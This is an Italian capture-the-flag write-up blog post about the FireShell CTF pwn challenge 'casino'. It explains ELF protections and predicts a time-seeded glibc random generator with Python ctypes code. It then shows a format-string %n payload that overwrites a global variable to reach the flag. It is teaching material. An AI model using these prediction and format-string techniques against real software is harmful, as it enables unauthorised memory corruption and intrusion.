@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="it-it">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="generator" content="Hugo 0.53" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="/index.xml" type="application/rss+xml" title="R13">
+<title>FireShell CTF - casino - R13</title>
+</head>
+<body>
+
+<header>
+  <div class="container clearfix">
+    <span class="base05">[</span><span class="base08">R</span><span class="base09">A</span><span class="base0a">D</span><span class="base0b">-</span><span class="base0c">1</span><span class="base0d">3</span><span class="base05">]</span>
+    <span class="base05"># <a class="path" href=https://rad-13.github.io/> home</a>/posts/casino/</span>
+    <div class="right">
+      
+    </div>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2019-01-28">January 28, 2019</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="/categories/ctf">ctf</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="/tags/FireShell">FireShell</a>
+
+        <a href="/tags/pwn">pwn</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">FireShell CTF - casino</h1>
+  <section class="body" itemprop="articleBody">
+    <script src="https://unpkg.com/vanilla-back-to-top@7.2.0/dist/vanilla-back-to-top.min.js"></script>
+    <script>addBackToTop({
+        diameter: 56,
+        backgroundColor: 'rgb(255, 204, 102);',
+        textColor: '#f2f0ec'
+      })</script>
+    <p><strong>casino</strong> è la seconda sfida proposta nella sezione pwning della <a href="https://ctftime.org/event/727">FireShell CTF</a>.
+Non è una sfida molto complessa, ma per via della sua originalità e delle tecniche richieste diverse dai soliti buffer overflow ho deciso di inserirla tra i post.</p>
+
+<p>La sfida presenta un solo eseguibile, un ELF64. <a href="/files/casino" download>Download</a></p>
+
+<p>Analizzando il programma con <a href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/">rabin2</a> possiamo dare un occhiata alle caratteristiche principali dell&rsquo;eseguibile.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">arch     x86
+baddr    0x400000
+binsz    11297
+bintype  elf
+bits     64
+canary   true
+sanitiz  false
+class    ELF64
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+RELRO    full
+rpath    NONE
+static   false
+stripped false
+subsys   linux
+va       true</code></pre></div>
+<p>I parametri importanti sono:</p>
+
+<ul>
+<li>canary;</li>
+<li>nx.</li>
+</ul>
+
+<p>Essendo nx a true lo stack non è eseguibile, combinato con canary a true si capisce fin da subito che il codice difficilmente sarà soggetto a tecniche di buffer overflow.
+Un ulteriore parametro è <strong>RELRO</strong>, settato a full.
+<strong>REL</strong>ocation <strong>R</strong>ead <strong>O</strong>nly__ è una tecnica che (come dice il nome) permette di avere un eseguibile in cui alcune sezioni sono read-only.
+<figure>
+    <img src="/img/ELF_layout.svg"/> <figcaption>
+            <h4>Layout di un ELF</h4>
+        </figcaption>
+</figure>
+
+Di default GCC compila il codice secondo un RELRO parziale, ovvero fa si che la GOT (Global Offset Table) venga prima della BSS. Il compilatore non può sapere prima del linking la posizone di eventuali variabili esterne al programma stesso (tipo uno shared object), al posto di tale variabile pone un simbolo, che verrà risolto in seguito. La GOT viene popolata dal linker dinamico, il quale provvede ad inserire i vari indirizzi negli appositi campi della tabella (risoluzione dei simpboli) durante il caricamento del programma in memoria.</p>
+
+<p>BSS (Block Started by Symbol, così chiamato per ragioni storiche) è invece un segmento contentente delle vere e proprie variabili globali, non inizializzate o inizializzate a 0.</p>
+
+<p>Posizionare la GOT prima del segmento BSS permette di evitare attacchi di tipo buffer overflow sulle variabili nel BSS a discapito di indirizzi nella GOT.</p>
+
+<p>Se si avesse la possibilità di sovvrascrivere un entry della GOT si potrebbe modificare il flusso dell&rsquo;eseguibile, ingannandolo su un eventuale valore nella tabella stessa, o addirittura, se si potesse modificare un valore nella PLT (Procedure Linkage Table) modificando l&rsquo;indirizzo di una funzione nella tabella, si potrebbe effettuare un <em>arbitrary code execution</em>.</p>
+
+<p>Il RELRO totale (detto full) previene totalmente questa eventualità rendendo la GOT e la PLT read-only, prevenendo quindi attacchi di <em>GOT overwrite</em>.</p>
+
+<p>Si noti che il full RELRO non è abilitato di default poichè causa non poca latenza nel caricamento in memoria di un binario, poichè tutti i simboli che puntano a variabili esterne vengono risolti e sostituiti prima di rendere la tabella read-only.</p>
+
+<p>Con la compilazione di casino secondo un full RELRO risulta ormai chiaro che questo eseguibile non sarà soggetto a buffer overflow.</p>
+
+<p>Eseguendo il programma ci viene chiesto di inserire un nome, a seguito di esso dobbiamo indovinare 100 numeri. Se si sbaglia il numero l&rsquo;esecuzione termina.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">What is your name? RAD13
+Welcome RAD13
+
+[1/100] Guess my number: 4
+Sorry! It was not my number</code></pre></div>
+<p>Apriamo il programam con <a href="https://rada.re/">radare2</a>, con il comando <strong>iS</strong> possiamo effettivamente notare che il segmento GOT viene prima di BSS:</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">[</span><span class="nf">Sections</span><span class="p">]</span>
+<span class="nf">Nm</span> <span class="no">Paddr</span>       <span class="no">Size</span> <span class="no">Vaddr</span>      <span class="no">Memsz</span> <span class="no">Perms</span> <span class="no">Name</span>
+<span class="err">00</span> <span class="err">0</span><span class="nf">x00000000</span>     <span class="mi">0</span> <span class="mi">0x00000000</span>     <span class="mi">0</span> <span class="p">----</span>
+<span class="err">01</span> <span class="err">0</span><span class="nf">x00000238</span>    <span class="mi">28</span> <span class="mi">0x00400238</span>    <span class="mi">28</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.interp</span>
+<span class="err">02</span> <span class="err">0</span><span class="nf">x00000254</span>    <span class="mi">32</span> <span class="mi">0x00400254</span>    <span class="mi">32</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.note.ABI_tag</span>
+<span class="err">03</span> <span class="err">0</span><span class="nf">x00000274</span>    <span class="mi">36</span> <span class="mi">0x00400274</span>    <span class="mi">36</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.note.gnu.build_id</span>
+<span class="err">04</span> <span class="err">0</span><span class="nf">x00000298</span>    <span class="mi">40</span> <span class="mi">0x00400298</span>    <span class="mi">40</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.gnu.hash</span>
+<span class="err">05</span> <span class="err">0</span><span class="nf">x000002c0</span>   <span class="mi">504</span> <span class="mi">0x004002c0</span>   <span class="mi">504</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.dynsym</span>
+<span class="err">06</span> <span class="err">0</span><span class="nf">x000004b8</span>   <span class="mi">197</span> <span class="mi">0x004004b8</span>   <span class="mi">197</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.dynstr</span>
+<span class="err">07</span> <span class="err">0</span><span class="nf">x0000057e</span>    <span class="mi">42</span> <span class="mi">0x0040057e</span>    <span class="mi">42</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.gnu.version</span>
+<span class="err">08</span> <span class="err">0</span><span class="nf">x000005a8</span>    <span class="mi">64</span> <span class="mi">0x004005a8</span>    <span class="mi">64</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.gnu.version_r</span>
+<span class="err">09</span> <span class="err">0</span><span class="nf">x000005e8</span>    <span class="mi">96</span> <span class="mi">0x004005e8</span>    <span class="mi">96</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.rela.dyn</span>
+<span class="err">10</span> <span class="err">0</span><span class="nf">x00000648</span>   <span class="mi">384</span> <span class="mi">0x00400648</span>   <span class="mi">384</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.rela.plt</span>
+<span class="err">11</span> <span class="err">0</span><span class="nf">x000007c8</span>    <span class="mi">23</span> <span class="mi">0x004007c8</span>    <span class="mi">23</span> <span class="p">-</span><span class="no">r-x</span> <span class="no">.init</span>
+<span class="err">12</span> <span class="err">0</span><span class="nf">x000007e0</span>   <span class="mi">272</span> <span class="mi">0x004007e0</span>   <span class="mi">272</span> <span class="p">-</span><span class="no">r-x</span> <span class="no">.plt</span>
+<span class="err">13</span> <span class="err">0</span><span class="nf">x000008f0</span>   <span class="mi">898</span> <span class="mi">0x004008f0</span>   <span class="mi">898</span> <span class="p">-</span><span class="no">r-x</span> <span class="no">.text</span>
+<span class="err">14</span> <span class="err">0</span><span class="nf">x00000c74</span>     <span class="mi">9</span> <span class="mi">0x00400c74</span>     <span class="mi">9</span> <span class="p">-</span><span class="no">r-x</span> <span class="no">.fini</span>
+<span class="err">15</span> <span class="err">0</span><span class="nf">x00000c80</span>   <span class="mi">150</span> <span class="mi">0x00400c80</span>   <span class="mi">150</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.rodata</span>
+<span class="err">16</span> <span class="err">0</span><span class="nf">x00000d18</span>    <span class="mi">68</span> <span class="mi">0x00400d18</span>    <span class="mi">68</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.eh_frame_hdr</span>
+<span class="err">17</span> <span class="err">0</span><span class="nf">x00000d60</span>   <span class="mi">304</span> <span class="mi">0x00400d60</span>   <span class="mi">304</span> <span class="p">-</span><span class="no">r--</span> <span class="no">.eh_frame</span>
+<span class="err">18</span> <span class="err">0</span><span class="nf">x00001d58</span>     <span class="mi">8</span> <span class="mi">0x00601d58</span>     <span class="mi">8</span> <span class="p">-</span><span class="no">rw-</span> <span class="no">.init_array</span>
+<span class="err">19</span> <span class="err">0</span><span class="nf">x00001d60</span>     <span class="mi">8</span> <span class="mi">0x00601d60</span>     <span class="mi">8</span> <span class="p">-</span><span class="no">rw-</span> <span class="no">.fini_array</span>
+<span class="err">20</span> <span class="err">0</span><span class="nf">x00001d68</span>   <span class="mi">496</span> <span class="mi">0x00601d68</span>   <span class="mi">496</span> <span class="p">-</span><span class="no">rw-</span> <span class="no">.dynamic</span>
+<span class="err">21</span> <span class="err">0</span><span class="nf">x00001f58</span>   <span class="mi">168</span> <span class="mi">0x00601f58</span>   <span class="mi">168</span> <span class="p">-</span><span class="no">rw-</span> <span class="no">.got</span>
+<span class="err">22</span> <span class="err">0</span><span class="nf">x00002000</span>    <span class="mi">36</span> <span class="mi">0x00602000</span>    <span class="mi">36</span> <span class="p">-</span><span class="no">rw-</span> <span class="no">.data</span>
+<span class="err">23</span> <span class="err">0</span><span class="nf">x00002024</span>     <span class="mi">0</span> <span class="mi">0x00602030</span>    <span class="mi">32</span> <span class="p">-</span><span class="no">rw-</span> <span class="no">.bss</span>
+<span class="err">24</span> <span class="err">0</span><span class="nf">x00002024</span>    <span class="mi">37</span> <span class="mi">0x00000000</span>    <span class="mi">37</span> <span class="p">----</span> <span class="no">.comment</span>
+<span class="err">25</span> <span class="err">0</span><span class="nf">x00002050</span>  <span class="mi">1992</span> <span class="mi">0x00000000</span>  <span class="mi">1992</span> <span class="p">----</span> <span class="no">.symtab</span>
+<span class="err">26</span> <span class="err">0</span><span class="nf">x00002818</span>   <span class="mi">783</span> <span class="mi">0x00000000</span>   <span class="mi">783</span> <span class="p">----</span> <span class="no">.strtab</span>
+<span class="err">27</span> <span class="err">0</span><span class="nf">x00002b27</span>   <span class="mi">250</span> <span class="mi">0x00000000</span>   <span class="mi">250</span> <span class="p">----</span> <span class="no">.shstrtab</span></code></pre></div>
+<p>Si noti che la GOT è riscrivibile ma la PLT no.</p>
+
+<p>Guardando la funzione main (0x40090d) si può notare una cosa interessante:</p>
+<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">call</span> <span class="nv">sym.imp.time</span>                  
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">seed</span><span class="p">]</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0xcccccccd</span>  
+<span class="nf">mul</span> <span class="nb">edx</span>     
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>   
+<span class="nf">shr</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">3</span>    
+<span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">seed</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">seed</span><span class="p">],</span> <span class="nb">eax</span></code></pre></div>
+<p>Tale codice rappresenta come il seed viene generato.</p>
+
+<p>I computer sono macchine deterministiche, ciò porta il difetto che risulta difficile ottenere qualcosa di randomico, numeri random vengono spesso generati tramite i movimenti del mouse, tempi di accesso a i dischi, statica sui contatti delle USB ed altri fattori poco deterministici.
+la <a href="http://man7.org/linux/man-pages/man3/rand.3.html">rand</a> offerta dalla glibc è invece un tipo di generatore detto pseudo casuale.
+Un generatore pseudo casuale è in grado di generare numeri randomici a partire da un intero con cui il generatore viene inizializzato, tale numero viene detto seed.</p>
+
+<p>Facciamo un esempio, si prenda il seguente codice, la mia reimplementazione del generatore psudo casuale della glibc:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define RSIZE 10
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="n">seed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">nRandom</span><span class="p">[</span><span class="n">RSIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">8</span><span class="p">};</span>
+
+<span class="kt">void</span> <span class="nf">srand</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">%</span><span class="n">RSIZE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">rand</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">seed</span> <span class="o">=</span> <span class="p">(</span><span class="n">seed</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="n">RSIZE</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">nRandom</span><span class="p">[</span><span class="n">seed</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">srand</span><span class="p">(</span><span class="mi">156</span><span class="p">);</span>
+
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">RSIZE</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span><span class="n">rand</span><span class="p">());</span>
+<span class="p">}</span></code></pre></div>
+<p>L&rsquo;output è il seguente:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">1 6 8 1 5 7 1 8 9 3 1 6 8 1 5 7 1 8 9 3</code></pre></div>
+<p>Se ora dovessimo prendere il nostro programma ed eseguirlo su un altro computer, dato lo stesso generatore e lo stesso seed la sequenza sarebbe la stessa, cambiando seed essa cambia.</p>
+
+<p>La sicurezza nell&rsquo;utilizzo di un generatore di numeri pseudocasuali (che di suo non andrebbe mai usato in contesti crittografici o comunque dove serve una &ldquo;vera&rdquo; randomicità) è trovare un modo randomico per inizializzare la sequenza.
+Il seed può essere inizializzato utilizzando diversi trucchi, il più comune sta nell&rsquo;usare la data attuale, che guarda caso, è proprio ciò che fa il nostro programma.</p>
+
+<p>Alla prima riga possiamo notare una chiamata alla funzione di libreria <a href="https://linux.die.net/man/2/time">time</a>, la quale torna il numero di secondi a partire dall 1970-01-01 00:00:00 +0000 (UTC).</p>
+
+<p>È proprio la scarsa risoluzione del valore ritornato a causare la falla nel generatore pseudo casuale, un secondo è un tempo troppo lungo per un computer, in quell&rsquo;arco di tempo un programma può aggancarsi al processo e generare in contemporanea il seed, ed è proprio ciò che fa la seguente funzione:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s1">&#39;libc-2.28.so&#39;</span><span class="p">)</span>
+
+<span class="n">seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">floor</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">*</span> <span class="mh">0xcccccccd</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="c1">#Prendo la parte alta di edx</span>
+<span class="n">seed</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span></code></pre></div>
+<p>Il seed in casino viene anche moltiplicato per un valore e shiftato di 3 byte a destra, se si osserva attentamente il codice si potrà notare che non è altro che la traduzione assembly -&gt; python della routine di generazione del seed.</p>
+
+<p>Si noti il modulo ctypes, il quale può permetterci di aggancarci alla glibc.</p>
+
+<p>Eseguiamo ora il programma:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> Opening connection to challs.fireshellsecurity.team on port <span class="m">31006</span>: Done
+<span class="o">[</span>Seed<span class="o">]</span>: 0x93b24b1
+What is your name?
+<span class="o">[</span>Num<span class="o">]</span>: 0x2833322e
+<span class="o">[</span><span class="m">1</span>/100<span class="o">]</span> Guess my number: Correct!
+
+<span class="o">[</span>Num<span class="o">]</span>: 0x4680273d
+<span class="o">[</span><span class="m">2</span>/100<span class="o">]</span> Guess my number: Correct!
+
+....................................
+
+<span class="o">[</span>Num<span class="o">]</span>: 0x7fad2b73
+<span class="o">[</span><span class="m">99</span>/100<span class="o">]</span> Guess my number: Correct!
+
+<span class="o">[</span>Num<span class="o">]</span>: 0x292b0fce
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">&#34;code.py&#34;</span>, line <span class="m">37</span>, in &lt;module&gt;
+    print<span class="o">(</span>conn.recvline<span class="o">())</span>
+  File <span class="s2">&#34;/usr/lib/python2.7/site-packages/pwnlib/tubes/tube.py&#34;</span>, line <span class="m">426</span>, in recvline
+    <span class="k">return</span> self.recvuntil<span class="o">(</span>self.newline, <span class="nv">drop</span> <span class="o">=</span> not keepends, <span class="nv">timeout</span> <span class="o">=</span> timeout<span class="o">)</span>
+  File <span class="s2">&#34;/usr/lib/python2.7/site-packages/pwnlib/tubes/tube.py&#34;</span>, line <span class="m">305</span>, in recvuntil
+    <span class="nv">res</span> <span class="o">=</span> self.recv<span class="o">(</span><span class="nv">timeout</span><span class="o">=</span>self.timeout<span class="o">)</span>
+  File <span class="s2">&#34;/usr/lib/python2.7/site-packages/pwnlib/tubes/tube.py&#34;</span>, line <span class="m">78</span>, in recv
+    <span class="k">return</span> self._recv<span class="o">(</span>numb, timeout<span class="o">)</span> or <span class="s1">&#39;&#39;</span>
+  File <span class="s2">&#34;/usr/lib/python2.7/site-packages/pwnlib/tubes/tube.py&#34;</span>, line <span class="m">156</span>, in _recv
+    <span class="k">if</span> not self.buffer and not self._fillbuffer<span class="o">(</span>timeout<span class="o">)</span>:
+  File <span class="s2">&#34;/usr/lib/python2.7/site-packages/pwnlib/tubes/tube.py&#34;</span>, line <span class="m">126</span>, in _fillbuffer
+    <span class="nv">data</span> <span class="o">=</span> self.recv_raw<span class="o">(</span>self.buffer.get_fill_size<span class="o">())</span>
+  File <span class="s2">&#34;/usr/lib/python2.7/site-packages/pwnlib/tubes/sock.py&#34;</span>, line <span class="m">46</span>, in recv_raw
+    raise EOFError
+EOFError
+<span class="o">[</span>*<span class="o">]</span> Closed connection to challs.fireshellsecurity.team port <span class="m">31006</span></code></pre></div>
+<p>Il programma va in crash dopo il 99 esimo numero, ovvero proprio quando il server dovrebbe rispondere con la flag.
+Il problema si trova nel seguente codice:</p>
+<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">local_54h</span><span class="p">],</span> <span class="mh">0x63</span>
+<span class="nf">jle</span> <span class="mh">0x400afc</span>  <span class="c1">;Un altro numero</span>
+<span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">local_58h</span><span class="p">],</span> <span class="mh">0x64</span>
+<span class="nf">jle</span> <span class="mh">0x400bd9</span>  <span class="c1">;return 0      </span>
+<span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">str.Cool__Here_s_another_prize</span>
+<span class="nf">call</span> <span class="nv">sym.imp.puts</span>
+<span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="mh">0x00400d08</span><span class="p">]</span>
+<span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">str.flag.txt</span>
+<span class="nf">call</span> <span class="nv">sym.imp.fopen</span></code></pre></div>
+<p>Tale parte viene eseguita ogni volta che si indovina un nuovo numero, viene confrontatata la variabile locale <em>local_54</em> con il valore 0x63, ovvero 99, e se è minore o uguale il loop si ripete ed un nuovo numero è chiesto.</p>
+
+<p>Se invece si sono indovinati i 100 numeri si confronta la variabile locale <em>local_58</em> con 0x64, ovvero 100, se è maggiore viene stampato il contenuto del file <em>flag.txt</em> se no il programma termina.</p>
+
+<p>Indovinare i 100 numeri quindi non basta, da questa parte in avanti ci si dimentica del discorso sul generatore casuale e si affronta un nuovo problema: &ldquo;Come rendere local_58 maggiore di 100&rdquo;.</p>
+
+<p>Di seguito viene mostrato un codice che integra le varie istruzioni che hanno effetto sul local_58:</p>
+<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">local_58h</span><span class="p">],</span> <span class="mi">0</span>
+<span class="c1">;...</span>
+<span class="nl">loop_99:</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">obj.bet</span>
+<span class="nf">add</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">local_58h</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="c1">;...</span>
+<span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">local_58h</span><span class="p">],</span> <span class="mh">0x64</span></code></pre></div>
+<p>Tale variabile viene direttamente influenzata da <em>obj.bet</em>, più precisamente parte come 0 ed a ogni ciclo di loop_99 si incrementa di 1, ciò ci fa capire che al momento del compare con 0x64 local_58 vale 0x63, per un numero il programma non ritorna la flag.</p>
+
+<p>Come notato più volte prima il programma non è assolutamente vulnerabile ad attacchi di tipo buffer overflow, e l&rsquo;unico input a parte i vari numeri è dato dal nome:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;print(&#34;A&#34;*1000)&#39;</span> <span class="p">|</span> ./casino
+
+What is your name? Welcome AAAAAAAAAAAAAAAA�J��
+<span class="o">[</span><span class="m">1</span>/100<span class="o">]</span> Guess my number: Sorry! It was not my number</code></pre></div>
+<p>Il nome viene letto tramite una normalissima read:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> -e <span class="s2">&#34;RAD13&#34;</span> <span class="p">|</span> strace ./casino
+
+read<span class="o">(</span><span class="m">0</span>, <span class="s2">&#34;RAD13\n&#34;</span>, <span class="m">16</span><span class="o">)</span> <span class="o">=</span> <span class="m">6</span>
+write<span class="o">(</span><span class="m">1</span>, <span class="s2">&#34;Welcome &#34;</span>, 8Welcome<span class="o">)</span> <span class="o">=</span> <span class="m">8</span>
+write<span class="o">(</span><span class="m">1</span>, <span class="s2">&#34;RAD13\n&#34;</span>, 6RAD13<span class="o">)</span> <span class="o">=</span> <span class="m">6</span></code></pre></div>
+<p>Ciò che è invece interessante è quando diamo il seguente input:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">What is your name? %p
+Welcome 0x7ffd1de4e570</code></pre></div>
+<p>Il programma è vulnerabile ad un attacco <em>format string attack</em>.</p>
+
+<p>In c è possibile stampare comodamente una variabile a schermo tramite l&rsquo;istruzione <a href="http://man7.org/linux/man-pages/man3/printf.3.html">printf</a>, sia ad esempio il seguente codice:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">name</span> <span class="o">=</span> <span class="s">&#34;RAD13</span><span class="se">\0</span><span class="s">&#34;</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div>
+<p>Il suo output sarà RAD13, la printf sa che name è una stringa dato il %s nel primo argomento, se avessimo usato %p avremmo ottenuto il suo indirizzo: 0x563aa7453004.
+Il problema si pone ora quando la printf viene usata senza passare il tipo dei parametri, ad esempio facendo:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span><span class="o">*</span> <span class="n">name</span> <span class="o">=</span> <span class="n">inputDaUtente</span><span class="p">();</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span></code></pre></div>
+<p>Senza formattazione la printf si limita ad una sostituzione mnemonica della variabile, se diamo in input: &ldquo;%p&rdquo; allora il comando lanciato sarà: <em>printf(&ldquo;%p&rdquo;)</em>, il quale non ha argomenti, e stamperà la prima variabile contenuta nella locazione stabilita dalla calling convention, che nel nostro caso (x86-64) è (in ordine): rdi, rsi, rdx, rcx, r8, r9 ed infine lo stack.</p>
+
+<p>Quindi, dare come input &ldquo;%p %p %p&rdquo; non farà altro che causare una <em>printf(&ldquo;%p %p %p&rdquo;)</em>, che non avendo parametri stamperà in formato puntatore il contenuto di: rsi, rdc ed rcx, si noti infatti che rdi (il primo parametro) è già occupato dall&rsquo;effettiva stringa &ldquo;%p %p %p&rdquo;.</p>
+
+<p>Proviamo su casino:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">What is your name? %p %p %p
+Welcome 0x7fffffffb7d0 0x7ffff7f94720 <span class="o">(</span>nil<span class="o">)</span></code></pre></div>
+<p>Se ci colleghiamo al processo con radare2 avremo il seguente stato dei registri poco prima della printf:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Registers                                                                 
+rax 0x00000000      rbx 0x00000000      rcx 0x00000000
+rdx 0x7ffff7f94720   r8 0x7ffff7f99540   r9 0x7ffff7f99540     
+rsi 0x7fffffffb7d0  rdi 0x7fffffffde90  rsp 0x7fffffffde70      
+rbp 0x7fffffffded0  rip 0x00400ac3      rflags 1I</code></pre></div>
+<p>Si ricordi che l&rsquo;rdine è: rsi, rdx, rcx, i conti tornano.</p>
+
+<p>Il trucco di tutto questo sta nell&rsquo;operatore <em>%n</em> della printf, esso funziona nel seguente modo:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&#34;AAA%n&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">x</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">%d&#34;</span><span class="p">,</span><span class="n">x</span><span class="p">);</span></code></pre></div>
+<p>L&rsquo;output del codice è 3, questo poichè il simbolo %n indica di scrivere nel puntatore passato come parametro successivo il numero di caratteri scritti fino ad ora, ed AAA sono 3 caratteri.</p>
+
+<p>Abbiamo ora tutti gli strumenti per modificare la variabile <em>obj.bet</em>, che si trova all&rsquo;indirizzo di memoria: 0x602020.
+L&rsquo;input da inserire è:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">AAA%11$n + p64(0x602020)</code></pre></div>
